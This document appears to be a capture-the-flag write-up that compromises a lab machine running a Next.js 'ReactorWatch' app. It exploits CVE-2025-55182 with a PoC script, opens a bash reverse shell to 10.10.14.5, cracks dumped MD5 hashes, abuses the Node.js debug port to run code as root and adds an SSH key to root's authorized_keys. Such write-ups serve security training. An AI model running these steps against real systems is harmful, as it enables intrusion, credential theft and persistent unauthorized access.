Ok we got a brand new machine. 

Let's start with a port scan.

```bash
sudo nmap -sS -sU --top-ports 200 10.129.3.70
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 07:44 -0400
Nmap scan report for 10.129.3.70
Host is up (0.035s latency).
Not shown: 198 closed tcp ports (reset), 159 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```
Ok so we got 2 ports open. ssh and a website on port 3000. The website is a 
```bash
Reactorwatch Core monitoring system v.3.2.1
```

After looking around for a while we can tell that its a next.js application.

```bash
curl -sI http://10.129.3.148:3000
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Content-Length: 17175
Date: Sun, 24 May 2026 15:58:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

There isnt much to go off lets start enumerating further with nuclei

```bash
window.next={version:"15.0.3",appDir:!0},("function"==typeof t.default||"object"==typeof t.default&&null!==t.default)&&void 
```
Ok so next.js is version 15.0.3 which is vulnerable to https://nvd.nist.gov/vuln/detail/CVE-2025-55182
https://github.com/advisories/GHSA-fv66-9v8q-g76r

```bash
Description

A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.
```



```bash
python3 poc-cve-2025-55182.py -u http://10.129.3.148:3000 -c 'id'
React2Shell PoC - CVE-2025-55182
---------------------------------

[+] Target URL : http://10.129.3.148:3000
[+] Command    : id

[+] Sending crafted Flight payload...
[+] HTTP status: 500

[✓] RCE confirmed. Command output:

    uid=999(node) gid=988(node) groups=988(node)

```

Ok RCE is confirmed. Now we just change the command to make us get a shell

```bash
nc -lvnp 4444

'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'

```

```bash
node@reactor:/opt/reactor-app$ ls
ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

There is a database so lets dump it

```bash
sqlite3 reactor.db
.dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

Lets put these to a .txt file and then crack them

```bash
hashcat -m 0 users.txt /usr/share/wordlists/rockyou.txt --username

engineer:39d97110eafe2a9a68639812cd271e8e:reactor1
```

Ok so now we got credentials. engineer:reactor1 let's try the ssh login


```bash
ssh engineer@10.129.3.148 
The authenticity of host '10.129.3.148 (10.129.3.148)' can't be established.
ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.3.148' (ED25519) to the list of known hosts.
engineer@10.129.3.148's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Sun May 24 16:52:43 2026 from 10.10.14.5
engineer@reactor:~$ 
```

Ok we are inside and we can read the flag. 

```bash
engineer@reactor:/home$ ss -tunlp
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process      
udp        UNCONN      0           0                   127.0.0.54:53                  0.0.0.0:*                     
udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                     
udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                     
tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                     
tcp        LISTEN      0           511                  127.0.0.1:9229                0.0.0.0:*                     
tcp        LISTEN      0           4096                   0.0.0.0:22                  0.0.0.0:*                     
tcp        LISTEN      0           4096                127.0.0.54:53                  0.0.0.0:*                     
tcp        LISTEN      0           511                          *:3000                      *:*                     
tcp        LISTEN      0           4096                      [::]:22                     [::]:*                     
engineer@reactor:/home$ curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/9eb6af19-4131-4fd1-92b8-a3832b2cf4b1",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/9eb6af19-4131-4fd1-92b8-a3832b2cf4b1",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "9eb6af19-4131-4fd1-92b8-a3832b2cf4b1",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/9eb6af19-4131-4fd1-92b8-a3832b2cf4b1"
} ]

```
https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse
The port 9229 is a node.js debug port. 

Since the debugger has full access to the Node.js execution environment, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (potential privilege escalation).

```bash
engineer@reactor:~$ node inspect localhost:9229
connecting to localhost:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
'uid=0(root) gid=0(root) groups=0(root)\n'
debug> 
```

Ok so we are root in the debug mode. Let's try to get a shell as root.

```bash
exec("process.mainModule.require('child_process').execSync(\"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxg9d/HAZ3re+d17VVZdCD4/8IELSmuhMUpbD1qUlNm rik@gmail.com' >> /root/.ssh/authorized_keys\").toString()")
```

I decided the easiest way was just to add us to the authorized-keys


now we can just ssh as root

```bash
ssh root@10.129.3.148    
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Sun May 24 17:24:19 2026 from 10.10.14.5
root@reactor:~# id
uid=0(root) gid=0(root) groups=0(root)
```


